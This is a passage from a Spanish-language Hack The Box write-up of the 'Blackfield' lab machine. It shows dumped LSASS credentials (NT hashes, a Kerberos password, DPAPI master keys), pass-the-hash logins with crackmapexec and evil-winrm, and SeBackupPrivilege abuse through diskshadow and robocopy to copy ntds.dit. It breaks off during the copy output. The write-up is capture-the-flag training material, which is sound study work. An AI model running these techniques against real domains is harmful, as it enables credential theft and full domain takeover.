-		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	<span class="o">==</span> WDIGEST <span class="o">[</span>59839]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 256940 <span class="o">(</span>3ebac<span class="o">)</span>
-session_id 0
-username DC01<span class="err">$</span>
-domainname BLACKFIELD
-logon_server
-logon_time 2020-02-23T17:59:13.068835+00:00
-sid S-1-5-18
-luid 256940
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.LOCAL
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 136764 <span class="o">(</span>2163c<span class="o">)</span>
-session_id 0
-username DC01<span class="err">$</span>
-domainname BLACKFIELD
-logon_server
-logon_time 2020-02-23T17:58:27.052945+00:00
-sid S-1-5-18
-luid 136764
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.LOCAL
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 134935 <span class="o">(</span>20f17<span class="o">)</span>
-session_id 0
-username DC01<span class="err">$</span>
-domainname BLACKFIELD
-logon_server
-logon_time 2020-02-23T17:58:26.834285+00:00
-sid S-1-5-18
-luid 134935
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.LOCAL
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 997 <span class="o">(</span>3e5<span class="o">)</span>
-session_id 0
-username LOCAL SERVICE
-domainname NT AUTHORITY
-logon_server
-logon_time 2020-02-23T17:57:47.162285+00:00
-sid S-1-5-19
-luid 997
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username:
-		Domain:
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 24405 <span class="o">(</span>5f55<span class="o">)</span>
-session_id 0
-username UMFD-0
-domainname Font Driver Host
-logon_server
-logon_time 2020-02-23T17:57:46.569111+00:00
-sid S-1-5-96-0-0
-luid 24405
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	<span class="o">==</span> WDIGEST <span class="o">[</span>5f55]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
-		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	== WDIGEST [5f55]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-
-== LogonSession ==
-authentication_id 24294 (5ee6)
-session_id 0
-username UMFD-0
-domainname Font Driver Host
-logon_server
-logon_time 2020-02-23T17:57:46.554117+00:00
-sid S-1-5-96-0-0
-luid 24294
-	== MSV ==
-		Username: DC01$
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	== WDIGEST [5ee6]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-	== Kerberos ==
-		Username: DC01$
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu`Ql;gvEE!f$DoO0F+,gP@P`fra`z4&amp;G3K'</span>mH:&amp;<span class="s1">'K^SW$FNWWx7J-N$^'</span>bzB1Duc3^Ez]En kh<span class="sb">`</span>b<span class="s1">'YSV7Ml#@G3@*(b$]j%#L^[Q`nCP'</span>&lt;Vb0I6
-		password <span class="o">(</span>hex<span class="o">)</span>260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	<span class="o">==</span> WDIGEST <span class="o">[</span>5ee6]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-
-<span class="o">==</span> LogonSession <span class="o">==</span>
-authentication_id 24282 <span class="o">(</span>5eda<span class="o">)</span>
-session_id 1
-username UMFD-1
-domainname Font Driver Host
-logon_server
-logon_time 2020-02-23T17:57:46.554117+00:00
-sid S-1-5-96-0-1
-luid 24282
-	<span class="o">==</span> MSV <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-	<span class="o">==</span> WDIGEST <span class="o">[</span>5eda]<span class="o">==</span>
-		username DC01<span class="err">$</span>
-		domainname BLACKFIELD
-		password None
-		password <span class="o">(</span>hex<span class="o">)</span>
-	<span class="o">==</span> Kerberos <span class="o">==</span>
-		Username: DC01<span class="err">$</span>
-		Domain: BLACKFIELD.local
-		Password: &amp;SYVE+&lt;ynu<span class="sb">`</span>Ql<span class="p">;</span>gvEE!f<span class="nv">$DoO0F</span>+,gP@P<span class="sb">`</span>fra<span class="sb">`</span>z4&amp;G3K<span class="s1">'mH:&amp;'</span>K^SW<span class="nv">$FNWWx7J</span><span class="nt">-N</span><span class="nv">$^</span><span class="s1">'bzB1Duc3^Ez]En kh`b'</span>YSV7Ml#@G3@<span class="k">*</span><span class="o">(</span>b<span class="nv">$]</span>j%#L^[Q<span class="sb">`</span>nCP<span class="s1">'&lt;Vb0I6
-		password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
-	== WDIGEST [5eda]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-
-== LogonSession ==
-authentication_id 22028 (560c)
-session_id 0
-username
-domainname
-logon_server
-logon_time 2020-02-23T17:57:44.959593+00:00
-sid None
-luid 22028
-	== MSV ==
-		Username: DC01$
-		Domain: BLACKFIELD
-		LM: NA
-		NT: b624dc83a27cc29da11d9bf25efea796
-		SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
-		DPAPI: NA
-
-== LogonSession ==
-authentication_id 999 (3e7)
-session_id 0
-username DC01$
-domainname BLACKFIELD
-logon_server
-logon_time 2020-02-23T17:57:44.913221+00:00
-sid S-1-5-18
-luid 999
-	== WDIGEST [3e7]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-	== Kerberos ==
-		Username: dc01$
-		Domain: BLACKFIELD.LOCAL
-	== WDIGEST [3e7]==
-		username DC01$
-		domainname BLACKFIELD
-		password None
-		password (hex)
-	== DPAPI [3e7]==
-		luid 999
-		key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
-		masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
-		sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
-	== DPAPI [3e7]==
-		luid 999
-		key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
-		masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
-		sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
-	== DPAPI [3e7]==
-		luid 999
-		key_guid 31632c55-7a7c-4c51-9065-65469950e94e
-		masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
-		sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
-	== DPAPI [3e7]==
-		luid 999
-		key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
-		masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
-		sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed
-</span></code></pre></div></div>
-
-<ul>
-  <li>Este usuario forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code> y tenemos sus <code class="language-plaintext highlighter-rouge">hash</code> NT.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">==</span> MSV <span class="o">==</span>
-		Username: svc_backup
-		Domain: BLACKFIELD
-		LM: NA
-		NT: 9658d1d1dcd9250115e2205d9f48400d
-		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
-		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a validar que el hash sea correcto.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>
-SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d
-</code></pre></div></div>
-
-<ul>
-  <li>Y vemos que si forma parte del grupo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>
-SMB         10.129.23.192   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span>
-HTTP        10.129.23.192   5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.23.192:5985/wsman
-WINRM       10.129.23.192   5985   DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\s</span>vc_backup:9658d1d1dcd9250115e2205d9f48400d <span class="o">(</span>Pwn3d!<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ya podemos conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'svc_backup'</span> <span class="nt">-H</span> <span class="s1">'9658d1d1dcd9250115e2205d9f48400d'</span>
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
-</span>blackfield<span class="se">\s</span>vc_backup
-</code></pre></div></div>
-
-<h2 id="user-flag">User flag</h2>
-
-<ul>
-  <li>Ya podemos leer la <strong>flag</strong>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
-3920bb317a0bef51027e2852be64b543
-</code></pre></div></div>
-
-<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
-
-<ul>
-  <li>Tenemos el privilegio <code class="language-plaintext highlighter-rouge">SeBackupPrivilege</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_backup<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
-
-PRIVILEGES INFORMATION
-<span class="nt">----------------------</span>
-
-Privilege Name                Description                    State
-<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
-SeMachineAccountPrivilege     Add workstations to domain     Enabled
-SeBackupPrivilege             Back up files and directories  Enabled
-SeRestorePrivilege            Restore files and directories  Enabled
-SeShutdownPrivilege           Shut down the system           Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
-</code></pre></div></div>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/hard/blackfield/5.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Vamos a crear un directorio <code class="language-plaintext highlighter-rouge">Temp</code> para desde allí hacer todo.</p>
-  </li>
-  <li>
-    <p>Vamos a dumpear el <code class="language-plaintext highlighter-rouge">ntds</code> pero de primeras no podemos hacer la copia por que no tenemos los suficientes privilegios.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; copy C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.nit
-Access to the path <span class="s1">'C:\Windows\NTDS\ntds.dit'</span> is denied.
-At line:1 char:1
-+ copy C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.nit
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : PermissionDenied: <span class="o">(</span>C:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit:FileInfo<span class="o">)</span> <span class="o">[</span>Copy-Item], UnauthorizedAccessException
-    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
-</code></pre></div></div>
-
-<ul>
-  <li>Pero si queremos ver el hash primero necesitamos una copia de system para usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; reg save HKLM<span class="se">\s</span>ystem system
-</code></pre></div></div>
-
-<ul>
-  <li>Podemos seguir los pasos como no lo dicen aquí <a href="https://pentestlab.blog/tag/diskshadow/">https://pentestlab.blog/tag/diskshadow/</a>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>zi.txt
-<span class="nb">set </span>context persistent nowriters
-add volume c: <span class="nb">alias </span>miguelito
-create
-expose %miguelito% z:
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vamos a subirlo a la maquina.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; upload zi.txt
-</code></pre></div></div>
-
-<ul>
-  <li>Pero no funciona.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; diskshadow.exe /s c:<span class="se">\T</span>emp<span class="se">\z</span>i.txt
-Microsoft DiskShadow version 1.0
-Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
-On computer:  DC01,  4/20/2024 7:01:46 PM
-
--&gt; <span class="nb">set </span>context persistent nowriter
-
-SET CONTEXT <span class="o">{</span> CLIENTACCESSIBLE | PERSISTENT <span class="o">[</span> NOWRITERS <span class="o">]</span> | VOLATILE <span class="o">[</span> NOWRITERS <span class="o">]</span> <span class="o">}</span>
-
-        CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
-        PERSISTENT              Specify that shadow copy is persist across program <span class="nb">exit</span>, reset or reboot.
-        PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
-        VOLATILE                Specify that shadow copy will be deleted on <span class="nb">exit </span>or reset.
-        VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.
-
-        Example: SET CONTEXT CLIENTACCESSIBLE
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Al parecer nos esta quitando la s de <code class="language-plaintext highlighter-rouge">nowriters</code> así que para evitar eso vamos añadir un espacio en cada línea del archivo.</p>
-  </li>
-  <li>
-    <p>Vamos a volver a subirlo a la maquina.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; erase zi.txt
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; upload zi.txt
-
-Info: Uploading /home/miguel/Hackthebox/Blackfield/content/zi.txt to C:<span class="se">\T</span>emp<span class="se">\z</span>i.txt
-
-Data: 128 bytes of 128 bytes copied
-
-Info: Upload successful!
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora si nos deja.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; diskshadow.exe /s c:<span class="se">\T</span>emp<span class="se">\z</span>i.txt
-Microsoft DiskShadow version 1.0
-Copyright <span class="o">(</span>C<span class="o">)</span> 2013 Microsoft Corporation
-On computer:  DC01,  4/20/2024 7:06:00 PM
-
--&gt; <span class="nb">set </span>context persistent nowriters
--&gt; add volume c: <span class="nb">alias </span>miguelito
--&gt; create
-Alias miguelito <span class="k">for </span>shadow ID <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span> <span class="nb">set </span>as environment variable.
-Alias VSS_SHADOW_SET <span class="k">for </span>shadow <span class="nb">set </span>ID <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span> <span class="nb">set </span>as environment variable.
-
-Querying all shadow copies with the shadow copy <span class="nb">set </span>ID <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span>
-
-	<span class="k">*</span> Shadow copy ID <span class="o">=</span> <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span>	%miguelito%
-		- Shadow copy <span class="nb">set</span>: <span class="o">{</span>c201721e-e14d-44dd-8a40-1fb46d14908c<span class="o">}</span>	%VSS_SHADOW_SET%
-		- Original count of shadow copies <span class="o">=</span> 1
-		- Original volume name: <span class="se">\\</span>?<span class="se">\V</span>olume<span class="o">{</span>6cd5140b-0000-0000-0000-602200000000<span class="o">}</span><span class="se">\ </span><span class="o">[</span>C:<span class="se">\]</span>
-		- Creation <span class="nb">time</span>: 4/20/2024 7:06:01 PM
-		- Shadow copy device name: <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1
-		- Originating machine: DC01.BLACKFIELD.local
-		- Service machine: DC01.BLACKFIELD.local
-		- Not exposed
-		- Provider ID: <span class="o">{</span>b5946137-7b9f-4925-af80-51abd60b20d5<span class="o">}</span>
-		- Attributes:  No_Auto_Release Persistent No_Writers Differential
-
-Number of shadow copies listed: 1
--&gt; expose %miguelito% z:
--&gt; %miguelito% <span class="o">=</span> <span class="o">{</span>07a7acf0-58c9-4f66-b559-38688a2be1c2<span class="o">}</span>
-The shadow copy was successfully exposed as z:<span class="se">\.</span>
--&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vamos a la unidad donde nos la creo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir </span>z:<span class="se">\</span>
-
-
-    Directory: z:<span class="se">\</span>
-
-
-Mode                LastWriteTime         Length Name
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
-d-----        5/26/2020   5:38 PM                PerfLogs
-d-----         6/3/2020   9:47 AM                profiles
-d-r---        3/19/2020  11:08 AM                Program Files
-d-----         2/1/2020  11:05 AM                Program Files <span class="o">(</span>x86<span class="o">)</span>
-d-----        4/20/2024   7:04 PM                Temp
-d-r---        2/23/2020   9:16 AM                Users
-d-----        9/21/2020   4:29 PM                Windows
-<span class="nt">-a----</span>        2/28/2020   4:36 PM            447 notes.txt
-</code></pre></div></div>
-
-<ul>
-  <li>Y gracias a esto ya podemos crear la copia del <code class="language-plaintext highlighter-rouge">ntds</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir </span>z:<span class="se">\W</span>indows<span class="se">\N</span>TDS
-
-
-    Directory: z:<span class="se">\W</span>indows<span class="se">\N</span>TDS
-
-
-Mode                LastWriteTime         Length Name
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
-<span class="nt">-a----</span>        4/10/2023   6:29 PM           8192 edb.chk
-<span class="nt">-a----</span>        4/20/2024   6:58 PM       10485760 edb.log
-<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edb00004.log
-<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edb00005.log
-<span class="nt">-a----</span>        2/23/2020   3:13 AM       10485760 edbres00001.jrs
-<span class="nt">-a----</span>        2/23/2020   3:13 AM       10485760 edbres00002.jrs
-<span class="nt">-a----</span>        2/23/2020   9:41 AM       10485760 edbtmp.log
-<span class="nt">-a----</span>        4/20/2024   5:43 PM       18874368 ntds.dit
-<span class="nt">-a----</span>        4/20/2024   5:58 PM          16384 ntds.jfm
-<span class="nt">-a----</span>        4/20/2024   5:43 PM         434176 temp.edb
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Básicamente lo que hicimos fue un <code class="language-plaintext highlighter-rouge">shadow cop</code>y de lo que hay en <code class="language-plaintext highlighter-rouge">C:\</code> pero en <code class="language-plaintext highlighter-rouge">Z</code>.</p>
-  </li>
-  <li>
-    <p>Pero con <code class="language-plaintext highlighter-rouge">copy</code> no se puede.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; copy z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.dit
-Access to the path <span class="s1">'z:\Windows\NTDS\ntds.dit'</span> is denied.
-At line:1 char:1
-+ copy z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit ntds.dit
-+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : PermissionDenied: <span class="o">(</span>z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\n</span>tds.dit:FileInfo<span class="o">)</span> <span class="o">[</span>Copy-Item], UnauthorizedAccessException
-    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a probar <code class="language-plaintext highlighter-rouge">robocopy</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; robocopy /b z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\ </span><span class="nb">.</span> ntds.dit
-
-<span class="nt">-------------------------------------------------------------------------------</span>
-   ROBOCOPY     ::     Robust File Copy <span class="k">for </span>Windows
-<span class="nt">-------------------------------------------------------------------------------</span>
-
-  Started : Saturday, April 20, 2024 7:12:11 PM
-   Source : z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\</span>
-     Dest : C:<span class="se">\T</span>emp<span class="se">\</span>
-
-    Files : ntds.dit
-
-  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30
-
-<span class="nt">------------------------------------------------------------------------------</span>
-
-	                   1	z:<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\</span>
-	    New File  		  18.0 m	ntds.dit
-  0.0%
-  0.3%
-  0.6%
-  1.0%
-  1.3%
-  1.7%
-  2.0%
-  2.4%
-  2.7%
-  3.1%
-  3.4%
-  3.8%
-  4.1%
-  4.5%
-  4.8%
-  5.2%
-  5.5%
-  5.9%
-  6.2%
-  6.5%
-  6.9%
-  7.2%
-  7.6%
-  7.9%
-  8.3%
-  8.6%
-  9.0%
-  9.3%
-  9.7%
- 10.0%
- 10.4%
- 10.7%
- 11.1%
- 11.4%
- 11.8%
- 12.1%
- 12.5%
- 12.8%
- 13.1%
- 13.5%
- 13.8%
- 14.2%
- 14.5%
- 14.9%
- 15.2%
- 15.6%
- 15.9%
- 16.3%
- 16.6%
- 17.0%
- 17.3%
- 17.7%
- 18.0%
- 18.4%
- 18.7%
- 19.0%
- 19.4%
- 19.7%
- 20.1%
- 20.4%
- 20.8%
- 21.1%
- 21.5%
- 21.8%
- 22.2%
- 22.5%
- 22.9%
- 23.2%
- 23.6%
- 23.9%
- 24.3%
- 24.6%
- 25.0%
- 25.3%
- 25.6%
- 26.0%
- 26.3%
- 26.7%
- 27.0%
- 27.4%
- 27.7%
- 28.1%
- 28.4%
- 28.8%
- 29.1%
- 29.5%
- 29.8%
- 30.2%
- 30.5%
- 30.9%
- 31.2%
- 31.5%
- 31.9%
- 32.2%
- 32.6%
- 32.9%
- 33.3%
- 33.6%
- 34.0%
- 34.3%
- 34.7%
- 35.0%
- 35.4%
- 35.7%
- 36.1%
- 36.4%
- 36.8%
- 37.1%
- 37.5%
- 37.8%
- 38.1%
- 38.5%
- 38.8%
- 39.2%
- 39.5%
- 39.9%
- 40.2%
- 40.6%
- 40.9%
- 41.3%
- 41.6%
- 42.0%
- 42.3%
- 42.7%
- 43.0%
- 43.4%
- 43.7%
- 44.0%
- 44.4%
- 44.7%
- 45.1%
- 45.4%
- 45.8%
- 46.1%
- 46.5%
- 46.8%
- 47.2%
- 47.5%
- 47.9%
- 48.2%
- 48.6%
- 48.9%
- 49.3%
- 49.6%
- 50.0%
- 50.3%
- 50.6%
- 51.0%
- 51.3%
- 51.7%
- 52.0%
- 52.4%
- 52.7%
- 53.1%
- 53.4%
- 53.8%
- 54.1%
- 54.5%
- 54.8%
- 55.2%
- 55.5%
- 55.9%
- 56.2%
- 56.5%
